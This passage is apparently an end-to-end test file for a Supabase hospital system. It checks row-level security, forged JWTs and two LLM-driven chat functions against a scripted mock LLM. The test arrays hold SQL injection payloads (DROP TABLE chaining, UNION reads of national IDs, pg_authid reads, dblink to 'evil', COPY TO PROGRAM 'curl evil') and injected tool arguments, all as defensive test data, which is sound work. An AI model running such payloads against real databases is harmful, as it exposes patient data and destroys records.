// End-to-end tests against a running Supabase stack (CI: `supabase start` + `supabase functions serve`).
// Covers what the SQL harness cannot: the real non-superuser `postgres` role, Auth, PostgREST, RLS through the API,
// and both chat Edge Functions driven by a scripted mock LLM (no Groq key needed).
//
// Env: API_URL, ANON_KEY, SERVICE_ROLE_KEY, JWT_SECRET, DB_URL (all printed by `supabase status -o env`)
//      MOCK_LLM_PORT (default 9100) — functions must be served with LLM_BASE_URL pointing at this port.
// Run: node tests/e2e/supabase.e2e.mjs   (exit code 1 if any case fails; writes a table to $GITHUB_STEP_SUMMARY)
import { createClient } from '@supabase/supabase-js';
import { createHmac } from 'node:crypto';
import { execFileSync } from 'node:child_process';
import { appendFileSync } from 'node:fs';
import http from 'node:http';
import { friendlyError } from '../../web/js/errors.js';

const need = (k) => { const v = process.env[k]; if (!v) { console.error(`missing env ${k}`); process.exit(2); } return v; };
const URL = need('API_URL'), ANON = need('ANON_KEY'), SERVICE = need('SERVICE_ROLE_KEY'), SECRET = need('JWT_SECRET'), DB_URL = need('DB_URL');
const MOCK_PORT = Number(process.env.MOCK_LLM_PORT || 9100);

// ---------- scripted mock LLM (OpenAI-compatible /chat/completions) ----------
let script = {};
let lastToolResults = [];
const mock = http.createServer(async (req, res) => {
  let body = ''; for await (const c of req) body += c;
  const send = (code, obj) => { res.writeHead(code, { 'content-type': 'application/json' }); res.end(JSON.stringify(obj)); };
  if (script.down) return send(503, { error: 'unavailable' });
  const j = JSON.parse(body || '{}');
  const toolMsgs = (j.messages ?? []).filter((m) => m.role === 'tool');
  let message;
  if (j.tools) { // chat-mcp: first turn asks for the scripted tool calls, then answers in text
    if (toolMsgs.length) lastToolResults = toolMsgs.map((m) => m.content);
    if (script.tool_calls && (toolMsgs.length === 0 || script.loop)) {
      message = { role: 'assistant', content: null, tool_calls: script.tool_calls.map((tc, i) => ({ id: `call_${toolMsgs.length}_${i}`, type: 'function',
        function: { name: tc.name, arguments: typeof tc.args === 'string' ? tc.args : JSON.stringify(tc.args) } })) };
    } else message = { role: 'assistant', content: 'คำตอบ' };
  } else if (String(j.messages?.[0]?.content).includes('v_pharmacist_screening_queue')) { // chat: the SQL-writing call carries the schema prompt
    message = { role: 'assistant', content: script.sql ?? 'select * from v_doctor_workload' };
  } else message = { role: 'assistant', content: 'สรุปผลตามตาราง' };
  send(200, { choices: [{ message }] });
});
await new Promise((ok) => mock.listen(MOCK_PORT, '0.0.0.0', ok)); // 0.0.0.0: reachable from the edge-runtime container
const setScript = (s) => { script = s; lastToolResults = []; };

// ---------- helpers ----------
const fresh = (key = ANON) => createClient(URL, key, { auth: { persistSession: false, autoRefreshToken: false } });
const admin = fresh(SERVICE);
const sql = (q) => execFileSync('psql', [DB_URL, '-X', '-A', '-t', '-c', q]).toString().trim();
const results = [];
const check = (cat, name, expect, actual, ok) => results.push({ cat, name, expect, actual: String(actual).slice(0, 160), ok: !!ok });
const b64 = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
const mint = (payload, secret, alg = 'HS256') => { const h = b64({ alg, typ: 'JWT' }), p = b64(payload);
  return alg === 'none' ? `${h}.${p}.` : `${h}.${p}.${createHmac('sha256', secret).update(`${h}.${p}`).digest('base64url')}`; };
const t = Date.now();
const idOf = (q) => Number(sql(q));
const STAFF = { doctor: idOf("select min(staff_id) from staff where role='doctor'"), pharmacist: idOf("select min(staff_id) from staff where role='pharmacist'"),
  nurse: idOf("select min(staff_id) from staff where role='nurse'"), pharmacist2: idOf("select max(staff_id) from staff where role='pharmacist'") };
const PATIENT_COUNT = sql('select count(*) from patient');

async function makeUser(tag, profile) {
  const email = `${tag}${t}@example.test`;
  const c = await admin.auth.admin.createUser({ email, password: 'secret123', email_confirm: true });
  if (c.error) throw new Error(`${tag}: ${c.error.message}`);
  if (profile) { const r = await admin.from('profiles').insert({ user_id: c.data.user.id, ...profile }); if (r.error) throw new Error(`${tag}: ${r.error.message}`); }
  const sb = fresh(); const s = await sb.auth.signInWithPassword({ email, password: 'secret123' });
  if (s.error) throw new Error(`${tag}: ${s.error.message}`);
  return { sb, id: c.data.user.id, token: s.data.session.access_token };
}
const U = { anon: { sb: fresh(), id: null, token: ANON } };
{ const sb = fresh(); const s = await sb.auth.signUp({ email: `self${t}@example.test`, password: 'secret123' });
  if (!s.data.session) throw new Error('self sign-up returned no session (is email confirmation on in config.toml?)');
  U.none = { sb, id: s.data.user.id, token: s.data.session.access_token }; }
// the patient account is linked to a patient with visits, prescriptions waiting for screening and a booking today,
// so every per-patient view has rows of its own
const PID = idOf(`select min(v.patient_id) from prescription pr join visit v using (visit_id)
  where pr.status in ('Pending','Screened') and v.patient_id in (select patient_id from booking where booking_date = current_date)`);
const PHN = sql(`select hn from patient where patient_id = ${PID}`);
U.patient = await makeUser('patient', { role: 'patient', patient_id: PID });
U.nurse = await makeUser('nurse', { role: 'nurse', staff_id: STAFF.nurse });
U.doctor = await makeUser('doctor', { role: 'doctor', staff_id: STAFF.doctor });
U.pharmacist = await makeUser('pharm', { role: 'pharmacist', staff_id: STAFF.pharmacist });
U.admin = await makeUser('admin', { role: 'admin' });

const TABLES = ['department', 'staff', 'patient', 'room', 'bed', 'visit', 'admission', 'diagnosis', 'lab_result', 'insurance_coverage', 'daily_charge',
  'booking', 'feedback', 'drug', 'drug_lot', 'prescription', 'prescription_item', 'dispense_record', 'inventory', 'drug_allergy_record'];
const VIEWS = ['v_booking_queue_today', 'v_doctor_workload', 'v_feedback_summary', 'v_bed_occupancy', 'v_visit_billing', 'v_top_diagnosis',
  'v_pharmacist_screening_queue', 'v_inventory_stock_status', 'v_drug_cost_summary'];
// what a patient account must see: its own rows of 4 tables, its own rows of the 3 per-patient views, all of the summary views
const OWN = (rel) => ({
  patient: 1, booking: `select count(*) from booking where patient_id = ${PID}`, visit: `select count(*) from visit where patient_id = ${PID}`,
  prescription: `select count(*) from prescription pr join visit v using (visit_id) where v.patient_id = ${PID}`,
  v_booking_queue_today: `select count(*) from v_booking_queue_today where hn = '${PHN}'`, v_visit_billing: `select count(*) from v_visit_billing where hn = '${PHN}'`,
  v_pharmacist_screening_queue: `select count(*) from v_pharmacist_screening_queue where hn = '${PHN}'`,
})[rel];
const patientExpect = (rel) => { const q = OWN(rel); return typeof q === 'number' ? q : q ? Number(sql(q)) : rel.startsWith('v_') ? Number(sql(`select count(*) from ${rel}`)) : 0; };
const count = async (sb, rel) => { const r = await sb.from(rel).select('*', { count: 'exact', head: true }); return r.error ? `ERR ${r.error.code || r.status}` : r.count; };

// ================= A. access control =================
let C = 'A สิทธิ์การเข้าถึง';
for (const [who, u] of Object.entries(U)) {
  const staff = ['nurse', 'doctor', 'pharmacist', 'admin'].includes(who);
  for (const [label, rels] of [['20 ตาราง', TABLES], ['9 views', VIEWS]]) {
    const got = []; for (const r of rels) got.push([r, await count(u.sb, r)]);
    const bad = got.filter(([r, n]) => who === 'anon' ? !String(n).startsWith('ERR') : staff ? !(typeof n === 'number' && n > 0)
      : who === 'patient' ? n !== patientExpect(r) : n !== 0);
    check(C, `${who}: อ่าน ${label}`, who === 'anon' ? 'ถูกปฏิเสธทุกตัว' : staff ? 'เห็นข้อมูลทุกตัว'
      : who === 'patient' ? 'เฉพาะของตัวเอง (view ภาพรวมเห็นทั้งหมด)' : '0 แถวทุกตัว',
      bad.length ? `ผิด ${bad.length} ตัว: ${bad.map(([r, n]) => `${r}=${n}`).join(', ')}` : `ถูกทั้ง ${rels.length} ตัว`, bad.length === 0);
  }
}
for (const who of ['none', 'patient']) {
  const sb = U[who].sb;
  const ins = await sb.from('patient').insert({ hn: `HX${t}`.slice(0, 20), national_id: String(t).slice(-13).padStart(13, '8'), first_name: 'x', last_name: 'x' }).select();
  check(C, `${who}: เพิ่มคนไข้`, 'ถูกปฏิเสธ 42501', ins.error?.code ?? `เพิ่มได้ ${ins.data?.length}`, ins.error?.code === '42501');
  const before = sql('select first_name from patient order by patient_id limit 1');
  const upd = await sb.from('patient').update({ first_name: 'hacked' }).gt('patient_id', 0).select();
  const after = sql('select first_name from patient order by patient_id limit 1');
  check(C, `${who}: แก้ชื่อคนไข้`, 'แก้ไม่ได้', `${upd.error?.code ?? `${upd.data?.length} แถว`}, ชื่อในฐาน=${after}`, after === before && !(upd.data?.length));
  const del = await sb.from('feedback').delete().gt('feedback_id', 0).select();
  check(C, `${who}: ลบ feedback`, 'ลบไม่ได้', del.error?.code ?? `${del.data?.length} แถว`, !(del.data?.length));
  const emb = await sb.from('patient').select('hn, visit(visit_id)');
  const own = who === 'patient';   // a patient sees its own row and its own visits, nobody else's
  check(C, `${who}: อ่านผ่าน embedding patient→visit`, own ? `แถวของตัวเองแถวเดียว (${PHN})` : '0 แถว', emb.error?.code ?? `${emb.data.length} แถว ${emb.data.map((r) => r.hn)}`,
    !emb.error && (own ? emb.data.length === 1 && emb.data[0].hn === PHN && emb.data[0].visit.length === patientExpect('visit') : emb.data.length === 0));
}
{ const sb = U.pharmacist.sb;
  const ins = await sb.from('patient').insert({ hn: `HP${t}`.slice(0, 20), national_id: String(t).slice(-13).padStart(13, '9'), first_name: 'ทดสอบ', last_name: 'ระบบ' }).select();
  const maxSeed = idOf("select max(patient_id) from patient where hn not like 'HP%'");
  check(C, 'pharmacist: เพิ่มคนไข้ใหม่', 'สำเร็จ id ไม่ชนกับ seed', ins.error?.message ?? `patient_id=${ins.data[0].patient_id}`, !ins.error && ins.data[0].patient_id >= maxSeed);
  const del = ins.data ? await sb.from('patient').delete().eq('patient_id', ins.data[0].patient_id).select() : { error: { message: 'insert failed' } };
  check(C, 'pharmacist: ลบคนไข้ที่ยังไม่มี visit', 'สำเร็จ', del.error?.message ?? `${del.data.length} แถว`, !del.error && del.data.length === 1); }
{ const r = await U.none.sb.from('profiles').insert({ user_id: U.none.id, role: 'admin' }).select();
  check(C, 'none: สร้าง profile admin ให้ตัวเอง', 'ถูกปฏิเสธ', r.error?.code ?? 'สร้างได้!', !!r.error && sql(`select count(*) from profiles where user_id='${U.none.id}'`) === '0'); }
for (const who of ['patient', 'pharmacist']) {
  const r = await U[who].sb.from('profiles').update({ role: 'admin', patient_id: null, staff_id: null }).eq('user_id', U[who].id).select();
  const role = sql(`select role from profiles where user_id='${U[who].id}'`);
  check(C, `${who}: เปลี่ยน role ตัวเองเป็น admin`, 'ไม่เปลี่ยน', `${r.error?.code ?? `${r.data.length} แถว`}, role=${role}`, role === who); }
{ const r = await U.pharmacist.sb.from('profiles').select('user_id');
  check(C, 'pharmacist: อ่าน profiles ของคนอื่น', 'เห็นแค่ของตัวเอง', `${r.data?.length} แถว`, r.data?.length === 1 && r.data[0].user_id === U.pharmacist.id);
  await U.admin.sb.from('profiles').delete().eq('user_id', U.pharmacist.id);
  check(C, 'admin: ลบ profile คนอื่นผ่าน API', 'ลบไม่ได้', `เหลือ ${sql(`select count(*) from profiles where user_id='${U.pharmacist.id}'`)} แถว`,
    sql(`select count(*) from profiles where user_id='${U.pharmacist.id}'`) === '1'); }
{ const spoof = await U.none.sb.from('chat_logs').insert({ user_id: U.pharmacist.id, question: 'spoof' }).select();
  check(C, 'none: เขียน chat_logs ในชื่อคนอื่น', 'ถูกปฏิเสธ 42501', spoof.error?.code ?? 'เขียนได้!', spoof.error?.code === '42501');
  const rd = await U.pharmacist.sb.from('chat_logs').select('user_id');
  check(C, 'pharmacist: อ่าน chat_logs', 'เห็นแค่ของตัวเอง', `${rd.data?.length} แถว`, !rd.error && rd.data.every((r) => r.user_id === U.pharmacist.id)); }
for (const who of ['anon', 'pharmacist']) {
  const r = await U[who].sb.rpc('run_readonly_query', { q: 'select * from v_doctor_workload' });
  check(C, `${who}: เรียก run_readonly_query ตรง`, 'ถูกปฏิเสธ', r.error ? `${r.error.code} ${r.status}` : 'เรียกได้!', !!r.error); }
{ const r = await U.admin.sb.from('v_top_diagnosis').insert({ icd_code: 'X00' });
  check(C, 'admin: เขียนลง view', 'ถูกปฏิเสธ', r.error?.code ?? 'เขียนได้!', !!r.error); }
{ const r = await fetch(`${URL}/rest/v1/users?select=email`, { headers: { apikey: ANON, Authorization: `Bearer ${U.admin.token}`, 'Accept-Profile': 'auth' } });
  check(C, 'admin: อ่าน auth.users ผ่าน REST', 'ถูกปฏิเสธ', r.status, r.status >= 400); }
const rest = (token) => fetch(`${URL}/rest/v1/patient?select=hn&limit=1`, { headers: { apikey: ANON, Authorization: `Bearer ${token}` } });
for (const [name, tok] of [
  ['JWT role service_role เซ็นด้วย secret ผิด', mint({ role: 'service_role', exp: 2e9 }, 'wrong-secret-wrong-secret-wrong-secret!')],
  ['JWT alg=none role service_role', mint({ role: 'service_role', exp: 2e9 }, null, 'none')],
  ['JWT ของ admin ที่หมดอายุ', mint({ role: 'authenticated', sub: U.admin.id, aud: 'authenticated', exp: Math.floor(t / 1000) - 60 }, SECRET)],
]) { const r = await rest(tok); check(C, name, 'REST ปฏิเสธ (401)', r.status, r.status === 401); }
{ const victim = await makeUser('deleted', { role: 'pharmacist', staff_id: STAFF.pharmacist2 });
  await admin.auth.admin.deleteUser(victim.id);
  const r = await rest(victim.token); const n = r.status === 200 ? (await r.json()).length : r.status;
  check(C, 'token เก่าของบัญชีที่ถูกลบ: อ่าน patient', 'ไม่เห็นข้อมูล', `HTTP ${r.status}, ${n}`, r.status !== 200 || n === 0);
  const f = await fetch(`${URL}/functions/v1/chat-mcp`, { method: 'POST', headers: { Authorization: `Bearer ${victim.token}`, 'content-type': 'application/json' }, body: '{"question":"x"}' });
  check(C, 'token เก่าของบัญชีที่ถูกลบ: ใช้ chat', 'ถูกปฏิเสธ', f.status, f.status === 401 || f.status === 403); }

// ================= E. patient portal: own records, book / cancel, contact details only =================
C = 'E ผู้ป่วย: ข้อมูลของตัวเอง';
{ const sb = U.patient.sb;
  const before = sql(`select row_to_json(p) from (select phone, address from patient where patient_id = ${PID}) p`);   // restored at the end
  const up = await sb.from('patient').update({ phone: '0899999999', address: 'ที่อยู่ทดสอบ' }).eq('patient_id', PID).select('phone');
  check(C, 'patient: แก้เบอร์โทร/ที่อยู่ของตัวเอง', 'สำเร็จ', up.error?.message ?? `${up.data.length} แถว`, !up.error && up.data.length === 1 && up.data[0].phone === '0899999999');
  for (const [name, change] of [['ชื่อ', { first_name: 'แก้เอง' }], ['ประวัติแพ้ยา', { allergy_note: 'ไม่แพ้อะไรเลย' }], ['เลขบัตรประชาชน', { national_id: '1234567890123' }]]) {
    const r = await sb.from('patient').update(change).eq('patient_id', PID).select();
    check(C, `patient: แก้${name}ของตัวเอง`, 'ถูกปฏิเสธ 42501', r.error?.code ?? 'แก้ได้!', r.error?.code === '42501'); }
  const other = idOf(`select min(patient_id) from patient where patient_id <> ${PID}`);
  const ot = await sb.from('patient').update({ phone: '0811111111' }).eq('patient_id', other).select();
  check(C, 'patient: แก้เบอร์คนไข้คนอื่น', 'ไม่มีแถวถูกแก้', ot.error?.code ?? `${ot.data.length} แถว`, !(ot.data?.length) && sql(`select coalesce(phone,'') from patient where patient_id=${other}`) !== '0811111111');
  const docs = await sb.rpc('doctor_directory');
  check(C, 'patient: ดูรายชื่อแพทย์สำหรับจองคิว', '> 0 คน', docs.error?.message ?? `${docs.data.length} คน`, !docs.error && docs.data.length > 0);
  const nd = await U.none.sb.rpc('doctor_directory');
  check(C, 'none: ดูรายชื่อแพทย์', '0 คน', nd.error?.code ?? `${nd.data.length} คน`, !nd.error && nd.data.length === 0);
  const day = new Date(Date.now() + 40 * 864e5).toISOString().slice(0, 10);
  const bkd = await sb.from('booking').insert({ staff_id: STAFF.doctor, booking_date: day, booking_time: '15:45', symptom: 'ทดสอบ' }).select().single();
  check(C, 'patient: จองคิวให้ตัวเอง', 'สำเร็จ ได้เลขคิวอัตโนมัติ', bkd.error?.message ?? `queue_no=${bkd.data.queue_no} patient=${bkd.data.patient_id} ${bkd.data.status}`,
    !bkd.error && bkd.data.patient_id === PID && bkd.data.queue_no >= 1 && bkd.data.status === 'pending');
  for (const [name, row, code] of [
    ['จองคิวให้คนอื่น', { patient_id: other, staff_id: STAFF.doctor, booking_date: day, booking_time: '15:50' }, '42501'],
    ['จองคิวสถานะ confirmed เอง', { staff_id: STAFF.doctor, booking_date: day, booking_time: '15:55', status: 'confirmed' }, '42501'],
    ['จองคิวย้อนหลัง', { staff_id: STAFF.doctor, booking_date: '2020-01-01', booking_time: '09:00' }, '23514'],
  ]) { const r = await sb.from('booking').insert(row).select(); check(C, `patient: ${name}`, `ถูกปฏิเสธ ${code}`, r.error?.code ?? 'จองได้!', r.error?.code === code); }
  if (bkd.data) {
    const mv = await sb.from('booking').update({ booking_time: '16:30' }).eq('booking_id', bkd.data.booking_id).select();
    check(C, 'patient: เลื่อนเวลาคิวเอง', 'ถูกปฏิเสธ 42501', mv.error?.code ?? 'เลื่อนได้!', mv.error?.code === '42501');
    const cn = await sb.from('booking').update({ status: 'cancelled' }).eq('booking_id', bkd.data.booking_id).select('status');
    check(C, 'patient: ยกเลิกคิวของตัวเอง', 'สำเร็จ', cn.error?.message ?? cn.data[0]?.status, !cn.error && cn.data[0]?.status === 'cancelled');
    const dl = await sb.from('booking').delete().eq('booking_id', bkd.data.booking_id).select();
    check(C, 'patient: ลบคิว', 'ลบไม่ได้', dl.error?.code ?? `${dl.data.length} แถว`, !(dl.data?.length) && sql(`select count(*) from booking where booking_id=${bkd.data.booking_id}`) === '1');
    sql(`delete from booking where booking_id = ${bkd.data.booking_id}`);
  }
  const ob = idOf(`select min(booking_id) from booking where patient_id <> ${PID} and status in ('pending','confirmed')`);
  const oc = await sb.from('booking').update({ status: 'cancelled' }).eq('booking_id', ob).select();
  check(C, 'patient: ยกเลิกคิวของคนอื่น', 'ไม่มีแถวถูกแก้', oc.error?.code ?? `${oc.data.length} แถว`, !(oc.data?.length) && sql(`select status from booking where booking_id=${ob}`) !== 'cancelled');
  sql(`update patient set (phone, address) = (select phone, address from json_populate_record(null::patient, $j$${before}$j$::json)) where patient_id = ${PID}`);
}

// ================= B/C/D. chat functions =================
async function ask(fn, question = 'คำถามทดสอบ', who = 'pharmacist', rawBody) {
  const t0 = Date.now();
  const r = await fetch(`${URL}/functions/v1/${fn}`, { method: 'POST', headers: { Authorization: `Bearer ${U[who].token}`, 'content-type': 'application/json' },
    body: rawBody ?? JSON.stringify({ question }) });
  const txt = await r.text(); let j; try { j = JSON.parse(txt); } catch { j = { error: `non-JSON: ${txt.slice(0, 60)}` }; }
  return { status: r.status, ms: Date.now() - t0, ...j };
}
const show = (r) => `HTTP ${r.status}, ${r.error ? `error: ${r.error}` : `${r.rows?.length ?? 0} แถว`}${r.ms > 3000 ? `, ${(r.ms / 1000).toFixed(1)}s` : ''}`;
const refused = (r) => r.status === 200 && !!r.error && !(r.rows?.length);

C = 'B chat: สิทธิ์ผู้ใช้';
for (const fn of ['chat', 'chat-mcp']) {
  setScript({ sql: 'select hn, patient_first_name, allergy_note, generic_name from v_pharmacist_screening_queue limit 5',
    tool_calls: [{ name: 'query_view', args: { view: 'v_pharmacist_screening_queue', columns: ['hn', 'patient_first_name', 'allergy_note', 'generic_name'], limit: 5 } }] });
  for (const who of ['anon', 'none']) {
    const r = await ask(fn, 'ขอรายชื่อผู้ป่วยที่แพ้ยา', who);
    check(C, `${fn}: ${who}`, who === 'anon' ? '401' : '403 "ยังไม่ได้รับสิทธิ์"', show(r), who === 'anon' ? r.status === 401 : r.status === 403 && /ยังไม่ได้รับสิทธิ์/.test(r.error ?? ''));
  }
  { const r = await ask(fn, 'ขอรายชื่อผู้ป่วยที่แพ้ยา', 'patient');   // same question: a patient gets only its own rows
    const want = Math.min(5, patientExpect('v_pharmacist_screening_queue'));
    check(C, `${fn}: patient`, `เฉพาะแถวของตัวเอง ${want} แถว (${PHN})`, `${show(r)} hn=${[...new Set((r.rows ?? []).map((x) => x.hn))]}`,
      r.status === 200 && !r.error && r.rows?.length === want && r.rows.every((x) => x.hn === PHN)); }
  for (const who of ['pharmacist', 'admin']) {
    const r = await ask(fn, 'ขอรายชื่อผู้ป่วยที่แพ้ยา', who);
    check(C, `${fn}: ${who}`, 'ได้ 5 แถว คอลัมน์ตามลำดับที่ขอ', `${show(r)} cols=${r.columns}`,
      !r.error && r.rows?.length === 5 && r.columns?.join() === 'hn,patient_first_name,allergy_note,generic_name');
  }
}

C = 'C chat (Text-to-SQL): SQL อันตรายจาก LLM';
const attacks = [
  ['อ่านตาราง patient ตรง', 'select * from patient'], ['ขอ national_id', 'select national_id, phone from patient'],
  ['ต่อคำสั่ง DROP', 'select * from v_doctor_workload; drop table patient'], ['ซ่อนคำสั่งหลัง --', 'select * from v_doctor_workload -- ; delete from patient'],
  ['คอมเมนต์ /* */', '/* hi */ select * from v_doctor_workload'], ['DELETE ใน CTE', 'with d as (delete from patient returning *) select * from d'],
  ['UPDATE ตรง', "update patient set first_name = 'x'"], ['pg_sleep', 'select pg_sleep(10)'],
  ['อ่าน JWT จาก current_setting', "select current_setting('request.jwt.claims', true)"], ['set_config เปลี่ยน role', "select set_config('role', 'postgres', true)"],
  ['อ่าน auth.users', 'select email from auth.users'], ['อ่าน pg_authid', 'select * from pg_catalog.pg_authid'],
  ['information_schema', 'select table_name from information_schema.tables'],
  ['UNION ไป patient', 'select hn, patient_first_name from v_visit_billing union select hn, national_id from patient'],
  ['subquery ไป patient', 'select * from v_doctor_workload where exists (select 1 from patient)'], ['comma join', 'select * from v_doctor_workload, patient'],
  ['CROSS JOIN patient', 'select * from v_doctor_workload cross join patient'], ['public.patient', 'select * from public.patient'],
  ['quoted identifier', 'select * from "patient"'], ['version()', 'select version()'], ['generate_series', 'select generate_series(1, 100000000)'],
  ['dblink', "select * from dblink('host=evil', 'select 1') as t(a int)"], ['COPY TO PROGRAM', "copy (select 1) to program 'curl evil'"],
  ['ฟังก์ชันนอกรายการ md5', 'select md5(hn) from v_visit_billing'],
  ['JOIN เกิน 5 ครั้ง', `select 1 from v_visit_billing a${' join v_visit_billing x on true'.repeat(6)}`],
  ['LLM ตอบเป็นข้อความ', 'นี่คือคำตอบของฉัน ไม่มี SQL'], ['LLM ตอบว่าง', ''],
];
for (const [name, q] of attacks) { setScript({ sql: q }); const r = await ask('chat'); check(C, name, 'ถูกปฏิเสธ ไม่รันคำสั่ง', show(r), refused(r)); }
setScript({ sql: 'select a.hn from v_visit_billing a join v_visit_billing b on true limit 100000' });
{ const r = await ask('chat'); check(C, 'ขอ LIMIT 100000', 'ไม่เกิน 100 แถว', show(r), !r.error && r.rows.length <= 100); }
setScript({ sql: 'select a.hn from v_visit_billing a join v_visit_billing b on true offset 5' });
{ const r = await ask('chat'); check(C, 'OFFSET ไม่มี LIMIT', 'ไม่เกิน 100 แถว', show(r), !r.error && r.rows.length <= 100); }
setScript({ sql: 'select a.hn from v_visit_billing a join v_visit_billing b on true join v_visit_billing c on true join v_visit_billing d on true join v_visit_billing e on true order by a.total_amount, b.total_amount, c.total_amount' });
{ const r = await ask('chat'); check(C, 'query หนักมาก', 'ถูกตัดด้วย timeout ตอบ error ภายใน 15 วิ', show(r), !!r.error && r.ms < 15000); }
setScript({ sql: 'select * from v_doctor_workload where false' });
{ const r = await ask('chat'); check(C, 'ผลลัพธ์ 0 แถว', 'ตอบ "ไม่พบข้อมูล…"', `${show(r)} answer=${r.answer}`, !r.error && r.rows.length === 0 && /ไม่พบข้อมูล/.test(r.answer ?? '')); }
setScript({ sql: '```sql\nselect doctor_name, booking_count from v_doctor_workload\n```' });
{ const r = await ask('chat'); check(C, 'LLM ห่อ SQL ใน code block', 'แกะ SQL แล้วตอบได้', show(r), !r.error && r.rows.length > 0); }
setScript({ down: true });
{ const r = await ask('chat'); check(C, 'Groq ล่ม (503)', '"ระบบ AI ไม่พร้อมใช้งาน…"', show(r), r.status === 200 && /ไม่พร้อม/.test(r.error ?? '')); }

C = 'D chat-mcp: tool argument อันตรายจาก LLM';
const mcp = async (calls, extra = {}) => { setScript({ tool_calls: calls, ...extra }); const r = await ask('chat-mcp'); r.tool = lastToolResults.join(' | '); return r; };
const mcpBad = [
  ['view นอกรายการ (patient)', [{ name: 'query_view', args: { view: 'patient' } }]],
  ['view = __proto__', [{ name: 'query_view', args: { view: '__proto__' } }]],
  ['view = constructor', [{ name: 'query_view', args: { view: 'constructor' } }]],
  ['คอลัมน์ national_id', [{ name: 'query_view', args: { view: 'v_pharmacist_screening_queue', columns: ['national_id'] } }]],
  ['คอลัมน์แฝง SQL', [{ name: 'query_view', args: { view: 'v_doctor_workload', columns: ['doctor_name from patient --'] } }]],
  ['filter op = DROP', [{ name: 'query_view', args: { view: 'v_doctor_workload', filters: [{ column: 'status', op: 'DROP', value: 'x' }] } }]],
  ['filter คอลัมน์แฝง SQL', [{ name: 'query_view', args: { view: 'v_doctor_workload', filters: [{ column: '1=1 or status', op: '=', value: 'x' }] } }]],
  ['ค่าตัวเลขแฝง SQL', [{ name: 'query_view', args: { view: 'v_doctor_workload', filters: [{ column: 'booking_count', op: '>', value: '1; drop table patient' }] } }]],
  ["ค่า ' OR 1=1 --", [{ name: 'query_view', args: { view: 'v_doctor_workload', filters: [{ column: 'doctor_name', op: '=', value: "' OR 1=1 --" }] } }]],
  ['ค่า UNION ไป patient', [{ name: 'query_view', args: { view: 'v_doctor_workload', filters: [{ column: 'doctor_name', op: '=', value: "x' UNION SELECT national_id, null, null, null, null FROM patient --" }] } }]],
  ['aggregate fn = pg_sleep', [{ name: 'aggregate_view', args: { view: 'v_doctor_workload', metrics: [{ fn: 'pg_sleep', column: 'booking_count' }] } }]],
  ['alias แฝง SQL', [{ name: 'aggregate_view', args: { view: 'v_doctor_workload', metrics: [{ fn: 'count', alias: 'x from patient --' }] } }]],
  ['sum บนคอลัมน์ข้อความ', [{ name: 'aggregate_view', args: { view: 'v_doctor_workload', metrics: [{ fn: 'sum', column: 'doctor_name' }] } }]],
  ['order direction แฝง SQL', [{ name: 'query_view', args: { view: 'v_doctor_workload', order_by: [{ column: 'status', direction: 'desc; drop table patient' }] } }]],
  ['order by random()', [{ name: 'query_view', args: { view: 'v_doctor_workload', order_by: [{ column: 'random()' }] } }]],
  ['tool ที่ไม่มีจริง (run_sql)', [{ name: 'run_sql', args: { sql: 'select * from patient' } }]],
  ['argument เป็น JSON เสีย', [{ name: 'query_view', args: '{"view": "v_doctor_workload", ' }]],
];
for (const [name, calls] of mcpBad) { const r = await mcp(calls); check(C, name, 'ไม่ได้ข้อมูล ไม่ crash', `${show(r)} | tool: ${r.tool.slice(0, 70)}`, r.status === 200 && !(r.rows?.length)); }
{ const r = await mcp([{ name: 'query_view', args: { view: 'v_visit_billing', limit: 1000000 } }]); check(C, 'limit 1,000,000', 'ไม่เกิน 100 แถว', show(r), !r.error && r.rows.length <= 100); }
{ const r = await mcp([{ name: 'query_view', args: { view: 'v_visit_billing', limit: -5 } }]); check(C, 'limit -5', '1 แถว', show(r), !r.error && r.rows.length === 1); }
{ const r = await mcp([{ name: 'query_view', args: { view: 'v_doctor_workload' } }], { loop: true }); check(C, 'LLM เรียก tool วนไม่จบ', 'หยุดเองและตอบได้', show(r), r.status === 200 && r.ms < 30000); }
{ const r = await mcp([{ name: 'aggregate_view', args: { view: 'v_doctor_workload', group_by: ['status'], metrics: [{ fn: 'sum', column: 'booking_count', alias: 'total' }] } }]);
  check(C, 'aggregate ปกติ', 'ได้ผลรวมตามสถานะ', `${show(r)} cols=${r.columns}`, !r.error && r.rows.length > 0 && r.columns?.join() === 'status,total'); }
{ const r = await mcp([{ name: 'query_view', args: { view: 'v_booking_queue_today', columns: ['queue_no', 'hn', 'doctor_name'] } }]);
  check(C, 'คิววันนี้', 'ได้แถว คอลัมน์ตามที่ขอ', `${show(r)} cols=${r.columns}`, !r.error && r.rows.length > 0 && r.columns?.join() === 'queue_no,hn,doctor_name'); }

C = 'E chat: ตรวจ input';
for (const fn of ['chat', 'chat-mcp']) {
  setScript({ sql: 'select * from v_doctor_workload', tool_calls: [{ name: 'query_view', args: { view: 'v_doctor_workload' } }] });
  for (const [name, body] of [['คำถามว่าง', '{"question":""}'], ['ช่องว่างล้วน', '{"question":"   "}'], ['501 ตัวอักษร', JSON.stringify({ question: 'ก'.repeat(501) })],
    ['question เป็นตัวเลข', '{"question":123}'], ['body ไม่ใช่ JSON', 'not json'], ['ไม่มี body', '']]) {
    const r = await ask(fn, null, 'pharmacist', body); check(C, `${fn}: ${name}`, 'error ภาษาไทย ไม่ crash', show(r), r.status < 500 && !!r.error && !(r.rows?.length));
  }
  const r = await ask(fn, 'ก'.repeat(500)); check(C, `${fn}: 500 ตัวอักษร (ขอบบน)`, 'รับได้', show(r), r.status === 200 && !/500 ตัวอักษร/.test(r.error ?? ''));
}
{ const before = Number(sql('select count(*) from chat_logs')); setScript({ sql: 'select * from v_doctor_workload' }); await ask('chat');
  const after = Number(sql('select count(*) from chat_logs')); check(C, 'chat_logs บันทึกทุกคำถาม', 'เพิ่ม 1 แถว', `${before} → ${after}`, after === before + 1); }

// ================= F. CRUD constraints → friendly Thai errors =================
C = 'F CRUD และข้อความ error บนเว็บ';
const sb = U.pharmacist.sb;
const bk = (await sb.from('booking').select('*').order('booking_id').limit(1)).data[0];
const pWithVisit = idOf('select min(patient_id) from visit');
const twoEmails = (await sb.from('patient').select('patient_id, email').not('email', 'is', null).order('patient_id').limit(2)).data;
const crud = [
  ['จองซ้ำหมอ/วัน/เวลาเดิม', () => sb.from('booking').insert({ patient_id: pWithVisit, staff_id: bk.staff_id, booking_date: bk.booking_date, booking_time: bk.booking_time, queue_no: 99 }), '23505'],
  ['ลบคนไข้ที่มี visit', () => sb.from('patient').delete().eq('patient_id', pWithVisit), '23503'],
  ['เบอร์โทร 5 หลัก', () => sb.from('patient').update({ phone: '12345' }).eq('patient_id', pWithVisit), '23514'],
